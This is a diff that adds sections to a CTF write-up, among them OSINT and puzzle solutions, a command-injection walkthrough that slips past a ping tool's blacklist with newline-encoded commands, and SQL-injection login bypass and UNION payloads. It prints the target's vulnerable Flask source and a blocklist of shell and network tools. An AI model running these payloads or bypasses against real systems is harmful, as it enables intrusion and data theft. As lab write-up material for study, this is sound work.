@@ -5,7 +5,7 @@ As you step into the second chamber, a figure manifests. Before you stands a for
 
 They leave nothing but a single image, a relic carrying his final secret. Hidden within its layers lies the key to ascend to the next chamber.
 
-## Writeup:
+## Writeup
 
 - On opening the file attached in the challenge, it shows:
   
@@ -228,7 +228,7 @@ citadel{th1s_ch4ll3ng3_1s_f0r_th4t_0n3_ex1ft00l_4nd_b1nw4lk_enthus14st}
 
 # Randomly Accessed Memories
 
-## Description: 
+## Description 
 clone it, pull it, reset it, stage it,
 commit, push it, fork, rebase it,
 merge it, branch it, tag it, log it,
@@ -242,7 +242,7 @@ You look around and discover a chamber containing a vast archive of Daft Punk’
 
 Challenge: https://github.com/evilcryptonite/daft-punk-archive
 
-## Writeup:
+## Writeup
 
 - `git clone https://github.com/evilcryptonite/daft-punk-archive` to clone the repository as mentioned in the challenge.
 - `cd daft-punk-archive` to change the current working directory to it.
@@ -401,10 +401,30 @@ Challenge: https://github.com/evilcryptonite/daft-punk-archive
 citadel{w3_4r3_up_4ll_n1t3_t0_g1t_lucky}
 ```
 
+# Coco Conjecture
+
+## Description 
+The door to the next floor is guarded by a figure who calls herself "the dragon CEO". She does not speak of mercy or choice. only of order and efficiency.
+
+To enter the next chamber, you must complete the task presented by her. Complete it exactly as instructed, achieving operational efficiency by her standards, and the path forward will open.
+
+Connection: `nc chall_citadel.cryptonitemit.in 61234`
+
+## Writeup
+
+- The challenge is the Collatz Conjecture challenge, as shown in Coco_Conjecture.pdf .
+- As mentioned in helped.md, first install `pwntools` by using the command `pip install pwntools`.
+- 
+
+### Flag: 
+
+```
+citadel{k1ryu_c0c0_h4s_4_g0_4t_4n_uns0lv3d_m4th3m4t1cs_pr0bl3m}
+```
 
 # XOR Slide 
 
-## Description 
+## Description
 You realise that a previous climber has set up a puzzle in what was otherwise an empty room, blocking the entrance to the next floor on the ceiling. You must slide the blocks forming the pyramid to create a path above.
 
 ## Writeup 
@@ -479,6 +499,306 @@ bro i have a cRAzy story to tell you i went to ant4rctica and BOOM i saw a rando
 ### Flag:
  ```citadel{pyr4m1d+x0r}```
 
+# The Sound of Music
+
+## Description
+🗼OSINT pt2: `citadweller` had a newfound interest in tracking the music they last listened to and posting ratings of new albums on various online platforms.
+
+The flag is hidden in these digital footprints across music platforms and split into three segments. You will need to find all three to uncover the complete code and move on to the next floor.
+
+## Writeup
+
+- First, the flag's part ii was found on https://rateyourmusic.com/~citadweller.
+  `🗼 OSINT pt.2, flag part ii : _n_started_shar1ng_st0r1es`
+- The above website also has another link http://tinyurl.com/citadweller which redirects to spotify, https://open.spotify.com/user/317w4n4m2a4btks6hrqomyo3wpqu. Spotify contains the         flag's part iii.
+  `flag part iii: _n_then_they_were_n0where_t0_be_f0und}`
+- `https://www.last.fm/user/citadweller` gives the part i.
+  `🗼OSINT pt.2, flag part i: citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n`
+- Combine all the 3 parts to get the full part.
+
+### Flag: 
+
+```
+citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n_n_started_shar1ng_st0r1es_n_then_they_were_n0where_t0_be_f0und}
+```
+
+# AetherCorp NetprobeX
+
+## Description
+
+You step into a simulation of the past, entering the ruins of AetherCorp, the most ambitious corporation in history, and their creation, NetProbeX, once the most advanced networking tool the world had ever seen. The floor reconstructs the events that led to humanity’s downfall.
+
+Your task is to find the hidden backdoor in NetProbeX, the flaw that triggered the collapse. By uncovering it, you can reverse the damage and retrieve the passcode to advance to the next floor.
+
+Engineers left faint traces in the logs — small, odd markers where separators once sat. Read these traces as if they divide commands.
+
+Challenge: http://chall_citadel.cryptonitemit.in:32772/
+
+## Writeup 
+
+- `127.0.0.1; id` to search for files that contain "flag".
+- The output is given below.
+  ```sh
+  Executing: ping -c 4 127.0.0.1; id
+
+  Error: Malicious character ';' detected.
+  ```
+  This means that the semicolon (`;`) was blocked.
+- `127.0.0.1%0aid` to try if newline works.
+- This results in the following.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0aid
+
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
+  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms
+  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.040 ms
+
+  --- 127.0.0.1 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3067ms
+  rtt min/avg/max/mdev = 0.015/0.033/0.040/0.010 ms
+  uid=100(ctf) gid=101(ctf) groups=101(ctf)
+  ```
+  It can be concluded that '%0a` works fine.
+- `127.0.0.1%0a find / -type f -name "*flag*" 2>/dev/null` to search for files that contain the term "flag" within them.
+- All system files and not challenge files are shown.
+- `127.0.0.1%0a grep -r "CTF{" / 2>/dev/null` is used for more precision.
+- The above results in an error as `{` is blocked.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a grep -r "CTF{" / 2>/dev/null
+
+  Error: Malicious character '{' detected.
+  ```
+- `127.0.0.1%0a ls -la` to check the current directory contents.
+- The command leads to the following.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a ls -la
+
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
+  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.039 ms
+  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms
+
+  --- 127.0.0.1 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3052ms
+  rtt min/avg/max/mdev = 0.016/0.033/0.044/0.010 ms
+  total 24
+  drwxr-xr-x 1 root root 4096 Oct  4 17:26 .
+  drwxr-xr-x 1 root root 4096 Oct  4 17:27 ..
+  -rwxr-xr-x 1 root root 2300 Oct  4 17:25 app.py
+  -rwxr-xr-x 1 root root  290 Oct  4 07:38 mission_briefing.txt
+  -rwxr-xr-x 1 root root   14 Oct  4 07:38 requirements.txt
+  drwxr-xr-x 2 root root 4096 Oct  4 07:38 templates
+  ```
+  `mission_briefing.txt` seems suspicious.
+- `127.0.0.1%0a cat mission_briefing.txt` to read the file's contents.
+- The above command doesn't work as `cat` has been blocked too.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a cat mission_briefing.txt
+
+  Error: Malicious command 'cat' detected.
+  ```
+- `127.0.0.1%0a head mission_briefing.txt` to read the file using an alternate method.
+- The above works and gives the following.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a head mission_briefing.txt
+
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms
+  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms
+  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.037 ms
+
+  --- 127.0.0.1 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3062ms
+  rtt min/avg/max/mdev = 0.012/0.031/0.038/0.011 ms
+  ================= OPERATION: SILENT ECHO =================
+                  CLASSIFICATION: BLACK ICE
+
+  Agent, your objective is to recover the Blacksite Key.
+  Our intel confirms it’s hidden deep within the AetherCorp network.
+
+  =========================================================
+  ```
+  This shows that this file doesn't contain the flag.
+- `127.0.0.1%0a head -100 app.py` to see if it might reveal the flag.
+- The above tells whats allowed and blocked.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a head -100 app.py
+
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
+  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.030 ms
+  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms
+
+  --- 127.0.0.1 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3050ms
+  rtt min/avg/max/mdev = 0.013/0.029/0.039/0.010 ms
+  import subprocess
+  import urllib.parse
+  import re
+  from flask import Flask, request, jsonify, render_template
+
+  app = Flask(__name__)
+
+  BLACKLISTED_WORDS = [
+      'sh', 'bash', 'zsh', 'python', 'perl', 'php', 'ruby', 'nc', 'netcat',
+      'wget', 'curl', 'nmap', 'ssh', 'ftp', 'rm', 'mv', 'cp', 'mkdir',
+      'touch', 'chmod', 'chown', 'reboot', 'shutdown', 'halt', 'poweroff',
+      'apt', 'yum', 'dnf', 'pacman', 'pip', 'sudo', 'su', 'passwd',
+      'useradd', 'groupadd','grep','cat', 'cd'
+  ]
+
+  BLACKLISTED_CHARS = [';', '|', '`', '$', '(', ')', '{', '}', '&', '\r', '\t']
+
+  WHITELIST = ['ls','*','/',]
+  def waf_filter(target_host):
+      for char in BLACKLISTED_CHARS:
+          if char in target_host:
+              return False, f"Error: Malicious character '{char}' detected."
+      all_words = re.split(r'[\s\n\r\t]+', target_host)
+      for word in all_words:
+          word = word.strip()
+          if word and word in BLACKLISTED_WORDS:
+               return False, f"Error: Malicious command '{word}' detected."
+      if '../' in target_host:
+          return False, "Error: Directory traversal detected."
+      return True, None
+
+  @app.route('/')
+  def serve_index():
+      return render_template('index.html')
+
+  @app.route('/ping', methods=['POST'])
+  def execute_ping():
+      data = request.get_json()
+      target_raw = data.get('target', '')
+      if not target_raw:
+          return jsonify({'error': 'Target host cannot be empty.'}), 400
+      target = urllib.parse.unquote(target_raw)
+      is_safe, error_message = waf_filter(target)
+      if not is_safe:
+          return jsonify({'output': error_message, 'is_error': True, 'raw_target': target_raw}), 400
+      command = f"ping -c 4 -W 3 {target}"
+      try:
+          result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10, cwd="./")
+          output = result.stdout + result.stderr
+          return jsonify({'output': output, 'is_error': bool(result.stderr), 'raw_target': target_raw})
+      except subprocess.TimeoutExpired:
+          return jsonify({'output': 'Error: The command timed out.', 'is_error': True, 'raw_target': target_raw}), 504
+      except Exception as e:
+          return jsonify({'output': f'An unexpected server error occurred: {e}', 'is_error': True, 'raw_target': target_raw}), 500
+
+  if __name__ == '__main__':
+      app.run(host='0.0.0.0', port=5000)
+  ```
+  `grep`, `|` are blocked but `head`, `tail`, `more` and `less` are allowed.
+- `127.0.0.1%0a ls -la templates` to check the template directories. It gets executed but no important information.
+- `127.0.0.1%0a env` to check the environmenta variabled. This too is executed but results in no flag.
+- Hint for Aethercorp NetProbeX:
+  Some instructions can be used to search through the depths of the system and find the key
+- `127.0.0.1%0a find / -type f -name "*key*" 2>/dev/null` to check for files with "key" in name as mentioned in the hint.
+- The above command gives the following.
+  ```sh
+  Executing: ping -c 4 127.0.0.1%0a find / -type f -name "*key*" 2>/dev/null
+
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+  64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
+  64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.040 ms
+  64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
+  64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.039 ms
+
+  --- 127.0.0.1 ping statistics ---
+  4 packets transmitted, 4 received, 0% packet loss, time 3075ms
+  rtt min/avg/max/mdev = 0.019/0.033/0.040/0.008 ms
+  /usr/local/lib/python3.11/site-packages/setuptools/monkey.py
+  /usr/local/lib/python3.11/curses/has_key.py
+  /usr/local/lib/python3.11/keyword.py
+  /usr/local/lib/python3.11/lib2to3/fixes/fix_has_key.py
+  /usr/local/lib/python3.11/idlelib/config-keys.def
+  /usr/local/lib/python3.11/idlelib/config_key.py
+  /usr/bin/lesskey
+  /usr/share/keyrings/debian-archive-keyring.pgp
+  /usr/share/keyrings/debian-archive-removed-keys.pgp
+  /usr/lib/x86_64-linux-gnu/security/pam_keyinit.so
+  /proc/sys/kernel/keys/maxkeys
+  /proc/sys/kernel/keys/persistent_keyring_expiry
+  /proc/sys/kernel/keys/root_maxkeys
+  /proc/sys/net/ipv4/tcp_fastopen_key
+  /proc/keys
+  /proc/key-users
+  /proc/1/task/1/attr/keycreate
+  /proc/1/attr/keycreate
+  /proc/2054/task/2054/attr/keycreate
+  /proc/2054/attr/keycreate
+  /proc/2183/task/2183/attr/keycreate
+  /proc/2183/attr/keycreate
+  /proc/2185/task/2185/attr/keycreate
+  /proc/2185/attr/keycreate
+  /var/lib/dpkg/info/debian-archive-keyring.postinst
+  /var/lib/dpkg/info/debian-archive-keyring.md5sums
+  /var/lib/dpkg/info/debian-archive-keyring.list
+  /var/lib/dpkg/info/debian-archive-keyring.prerm
+  /var/lib/dpkg/info/debian-archive-keyring.postrm
+  /var/lib/dpkg/info/debian-archive-keyring.preinst
+  /var/lib/dpkg/info/debian-archive-keyring.conffiles
+  /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
+  /sys/kernel/btf/hyperv_keyboard
+  /sys/devices/0006:045E:0621.0001/input/input1/capabilities/key
+  /sys/devices/LNXSYSTM:00/LNXSYBUS:00/ACPI0004:00/VMBUS:00/d34b2567-b9b6-42b9-8778-0a4ec0b955bf/serio0/input/input0/capabilities/key
+  /sys/module/libnvdimm/parameters/key_revalidate
+  ```
+  `/var/lib/aethercorp/archive/.secrets/blacksite_key.dat` seems to contains the flag.
+- `127.0.0.1%0a head /var/lib/aethercorp/archive/.secrets/blacksite_key.dat` to read the file. It gets executed and shows the flag.
+  
+### Flag: 
+
+```
+citadel{bl4ck51t3_4cc3ss_gr4nt3d}
+```
+
+# Database Incursion
+
+## Description 
+
+After your legendary battle with the artist, the virtual world has returned, stretching around you in endless grids and flickering data, you find a rogue data terminal and on careful inspection, you find you’re able to inject rogue structured queries. Using this critical vulnerability, find a way to extract the hidden passcode.
+
+Challenge: https://databaseincursion.citadel.cryptonitemit.in
+
+## Writeup 
+
+- The website is a classic login form vulnerable to SQL injection.
+  
+  <img width="2940" height="1610" alt="image" src="https://github.com/user-attachments/assets/49e1344e-ea9f-4691-bd2f-9ab6bd7a63d2" />
+  
+- `' OR '1'='1` in the username while leaving the password empty to confirm SQL injection vulnerability. This leads to the following webpage.
+  
+  <img width="2940" height="1606" alt="image" src="https://github.com/user-attachments/assets/3e69f89f-319b-4174-94ff-ef062554561e" />
+  
+- As someone from management has the flag, `' UNION SELECT name FROM sqlite_master --` but system tables have been blocked.
+
+  <img width="2940" height="1600" alt="image" src="https://github.com/user-attachments/assets/0fb7b471-409d-41b5-b7a2-31d14057c9df" />
+
+- `Management' OR department='Management' --` to search for the management department.
+
+  <img width="2940" height="1598" alt="image" src="https://github.com/user-attachments/assets/da22e9a9-3130-4fc4-b400-2e30448e4084" />
+
+- `Kiwi' OR name='Kiwi' --` to search for her. The flag isn't shown in the results.
+
+  <img width="2940" height="1594" alt="image" src="https://github.com/user-attachments/assets/f971b8e0-7033-424f-848b-d744fe056154" />
+
+- `' UNION SELECT 1,name,department,email,notes FROM employees WHERE name='Kiwi' --` to check all the data about Kiwi. The flag is shown.
+
+  <img width="2940" height="1592" alt="image" src="https://github.com/user-attachments/assets/547ad08c-b7ce-4339-875d-7abcc423f12d" />
+
+## Flag: 
+
+```
+citadel{wh3n_w1ll_y0u_f1nd_0u7_1f_175_5ql_0r_53qu3l?}
+```
 
  # A Memory's a Heavy Burden 
 
